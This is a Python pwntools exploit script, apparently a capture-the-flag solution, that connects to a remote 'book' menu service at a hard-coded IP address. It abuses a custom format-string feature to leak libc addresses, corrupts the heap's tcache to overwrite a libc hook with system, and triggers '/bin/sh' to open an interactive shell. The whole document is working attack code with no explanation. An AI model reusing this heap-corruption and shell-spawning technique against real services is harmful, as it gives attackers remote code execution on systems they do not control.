from pwn import *
context.log_level='debug'
def cmd(c):
    p.sendlineafter(">",str(c).encode('utf-8'))
def add(size,author=b"a",c=b'c'):
    cmd(1)
    p.sendlineafter(":",b"Content size is "+str(size).encode('utf-8'))
    p.sendlineafter(":",b"Book author is "+author)
    p.sendlineafter(":",b"Book content is "+c)
def free(idx):
    cmd(2)
    p.sendlineafter(":",b'Book idx is '+str(idx).encode('utf-8'))
def puts(s,idx=0):
    cmd(3)
    p.sendlineafter(":",b'Book idx is '+str(idx).encode('utf-8'))
    p.sendlineafter("You can show book by yourself\n",b'My format '+s)

p=remote("43.155.72.106",9999)
#p=process("./pwn")
for x in range(9):
    add(0x68)
for x in range(1,8):
    free(x)
free(0)
for x in range(7):
    add(0x68)
add(0x1)

puts(b"%r%m%r",7)
base=u64(p.read(6)+b'\0\0')-(0x7ffff7facc61-0x7ffff7dc1000)
log.warning(hex(base))
free(5)

free(6)
puts(b'%1%\0'+b"\1"*0x5e+p64(0x1eeb28-0x10+base))

#puts(b'%\0'+b"\1"*0xb0+p64(0x1eeb28-0x10+base))
add(0x68)

#gdb.attach(p,'b *malloc')
puts(b"/bin/sh;%%%%%%%\x0011111"+p64(0x55410+base))
p.interactive()